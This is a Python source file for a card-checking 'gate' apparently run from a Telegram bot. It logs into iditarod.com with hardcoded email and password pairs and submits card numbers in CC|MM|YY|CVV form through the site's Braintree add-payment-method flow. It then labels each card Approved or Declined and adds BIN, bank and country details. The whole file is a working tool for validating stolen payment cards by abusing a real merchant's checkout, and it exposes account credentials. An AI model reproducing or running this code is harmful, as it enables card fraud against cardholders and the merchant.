# ============================================================
#  Braintree Auth Checker (B3AUTH Gate)
#  Session-login based — uses accounts on iditarod.com
#  Ported from b3auth_1.py / b3mass_1.py
# ============================================================

import base64
import random
import time
import re
import os
import requests
import logging

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

_BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ── Accounts ────────────────────────────────────────────────
# Loaded from b3auth_accounts.txt  (email:password per line)
# Falls back to hardcoded defaults if file missing
_ACCOUNTS_FILE = os.path.join(_BASE_DIR, "b3auth_accounts.txt")

_DEFAULT_ACCOUNTS = [
    ("teamdiwas@gmail.com", "@khatrieex"),
    ("khatrieex0011@gmail.com", "@khatrieex"),
    ("khatrieex0015@gmail.com", "@khatrieex"),
]

SITE_URL = "https://iditarod.com"


def _load_accounts():
    """Load accounts from file, fall back to defaults."""
    if os.path.exists(_ACCOUNTS_FILE):
        accs = []
        with open(_ACCOUNTS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":", 1)
                if len(parts) == 2:
                    accs.append((parts[0].strip(), parts[1].strip()))
        if accs:
            return accs
    return _DEFAULT_ACCOUNTS[:]


def _get_accounts():
    return _load_accounts()


# ── Helpers ─────────────────────────────────────────────────

def _get_between(s, start, end):
    try:
        return s.split(start)[1].split(end)[0]
    except (IndexError, AttributeError):
        return None


def _format_response(result_text):
    approved_messages = [
        "Payment method successfully added.",
        "Nice! New payment method added",
        "Invalid postal code or street address.",
        "avs: Gateway Rejected: avs",
        "81724: Duplicate card exists in the vault.",
    ]
    if any(msg in result_text for msg in approved_messages):
        return "Approved"
    clean = re.sub(r"<[^<]+?>", "", result_text).strip()
    return clean if clean else "Unknown"


# ── BIN lookup ──────────────────────────────────────────────

def _get_bin_info(bin6):
    default = {
        "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN",
        "bank": "UNKNOWN", "country": "UNKNOWN", "emoji": "🏳️",
    }
    try:
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin6}", timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d and "brand" in d:
                return {
                    "brand": d.get("brand", "UNKNOWN"),
                    "type": d.get("type", "UNKNOWN"),
                    "level": d.get("brand", "UNKNOWN"),
                    "bank": d.get("bank", "UNKNOWN"),
                    "country": d.get("country_name", "UNKNOWN"),
                    "emoji": d.get("country_flag", "🏳️"),
                }
    except Exception:
        pass
    return default


# ── Core checker ────────────────────────────────────────────

def _process_card(fullz, account, proxy_dict):
    """Single card check via Braintree session-login on iditarod.com."""
    try:
        cc, mes, ano, cvv = fullz.split("|")
        username, password = account

        if len(mes) < 2:
            mes = "0" + mes
        if "20" not in ano:
            ano = f"20{ano}"

        session = requests.Session()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        headers = {"User-Agent": ua}

        login_url = f"{SITE_URL}/my-account/add-payment-method/"

        # Step 1: GET login page
        try:
            resp = session.get(login_url, headers=headers, proxies=proxy_dict, timeout=25)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp = session.get(login_url, headers=headers, proxies=None, timeout=25)

        login_nonce = _get_between(resp.text, 'name="woocommerce-login-nonce" value="', '"')
        if not login_nonce:
            return {"status": "Error", "response": "Login Nonce Not Found"}

        # Step 2: POST login
        headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": SITE_URL,
            "Referer": login_url,
        })
        login_data = {
            "username": username,
            "password": password,
            "woocommerce-login-nonce": login_nonce,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "login": "Log in",
        }
        try:
            session.post(login_url, headers=headers, data=login_data, proxies=proxy_dict, timeout=25)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            session.post(login_url, headers=headers, data=login_data, proxies=None, timeout=25)

        # Step 3: GET payment page for nonces
        try:
            resp = session.get(login_url, headers=headers, proxies=proxy_dict, timeout=25)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp = session.get(login_url, headers=headers, proxies=None, timeout=25)

        pnonce = _get_between(resp.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        client_token_nonce = _get_between(resp.text, '"client_token_nonce":"', '"')
        if not pnonce or not client_token_nonce:
            return {"status": "Error", "response": "Payment Nonces Not Found"}

        # Step 4: AJAX — get Braintree client token
        ajax_headers = headers.copy()
        ajax_headers["X-Requested-With"] = "XMLHttpRequest"
        ajax_data = {"action": "wc_braintree_credit_card_get_client_token", "nonce": client_token_nonce}
        try:
            resp = session.post(f"{SITE_URL}/wp-admin/admin-ajax.php", headers=ajax_headers, data=ajax_data, proxies=proxy_dict, timeout=25)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp = session.post(f"{SITE_URL}/wp-admin/admin-ajax.php", headers=ajax_headers, data=ajax_data, proxies=None, timeout=25)

        try:
            jdata = resp.json()
        except Exception:
            return {"status": "Error", "response": "Invalid AJAX response"}

        if "data" not in jdata:
            return {"status": "Error", "response": "Client Token Data Not Found"}

        decoded_token = base64.b64decode(jdata["data"]).decode("utf-8")
        auth_fingerprint = _get_between(decoded_token, 'authorizationFingerprint":"', '"')
        if not auth_fingerprint:
            return {"status": "Error", "response": "Auth Fingerprint Not Found"}

        # Step 5: Tokenize via Braintree GraphQL
        graphql_headers = {
            "Authorization": f"Bearer {auth_fingerprint}",
            "Braintree-Version": "2018-05-10",
            "Content-Type": "application/json",
            "Origin": "https://assets.braintreegateway.com",
            "User-Agent": ua,
        }
        graphql_data = {
            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": "d891c037-b1ca-4cf9-90bc-e31dca938ee4"},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
            "variables": {
                "input": {
                    "creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano, "cvv": cvv},
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        try:
            resp = requests.post("https://payments.braintree-api.com/graphql", headers=graphql_headers, json=graphql_data, timeout=25)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp = requests.post("https://payments.braintree-api.com/graphql", headers=graphql_headers, json=graphql_data, timeout=25, proxies=None)

        rj = resp.json()
        if "errors" in rj:
            err_msg = rj["errors"][0].get("message", "Unknown")
            return {"status": "Declined", "response": err_msg}

        try:
            token = rj["data"]["tokenizeCreditCard"]["token"]
        except (KeyError, TypeError):
            return {"status": "Error", "response": "Tokenization Failed"}

        # Step 6: Final POST — add payment method
        final_data = [
            ("payment_method", "braintree_credit_card"),
            ("wc_braintree_credit_card_payment_nonce", token),
            ("wc-braintree-credit-card-tokenize-payment-method", "true"),
            ("woocommerce-add-payment-method-nonce", pnonce),
            ("_wp_http_referer", "/my-account/add-payment-method/"),
            ("woocommerce_add_payment_method", "1"),
        ]
        try:
            resp = session.post(login_url, headers=headers, data=final_data, proxies=proxy_dict, timeout=25)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp = session.post(login_url, headers=headers, data=final_data, proxies=None, timeout=25)

        # Step 7: Parse final response
        if "Payment method successfully added" in resp.text or "payment method added" in resp.text.lower():
            result_text = "Payment method successfully added."
        else:
            raw = _get_between(resp.text, '<ul class="woocommerce-error" role="alert">', "</ul>")
            if raw:
                m = re.search(r"Status code\s*(.*)</li>", raw)
                result_text = m.group(1).strip() if m else raw
            else:
                result_text = "Unknown error"

        status_str = _format_response(result_text)
        return {"status": "Approved" if status_str == "Approved" else "Declined", "response": status_str}

    except Exception as e:
        return {"status": "Error", "response": str(e)}


# ── Public API — called by tg_bot gate system ───────────────

def check_card(cc_line, proxy_dict=None):
    """
    Entry point for tg_bot gate.
    cc_line: "CC|MM|YY|CVV"
    Returns formatted result string.
    """
    start = time.time()
    accounts = _get_accounts()
    account = random.choice(accounts)

    result = _process_card(cc_line, account, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")

    parts = cc_line.strip().split("|")
    n = parts[0] if parts else "?"
    mm = parts[1] if len(parts) > 1 else "?"
    yy = parts[2] if len(parts) > 2 else "?"
    cvc = parts[3] if len(parts) > 3 else "?"

    bin_info = _get_bin_info(n[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {n}|{mm}|{yy}|{cvc}\n"
            f"Gateway: Braintree Auth (Session)\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Country: {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {n}|{mm}|{yy}|{cvc}\n"
            f"Gateway: Braintree Auth (Session)\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site():
    """Health check — can we reach iditarod.com and see Braintree?"""
    try:
        r = requests.get(
            f"{SITE_URL}/my-account/add-payment-method/",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=10, allow_redirects=True,
        )
        alive = r.status_code == 200 and "braintree" in r.text.lower()
        return alive, f"HTTP {r.status_code}" + (" | Braintree found" if alive else " | No Braintree")
    except Exception as e:
        return False, str(e)
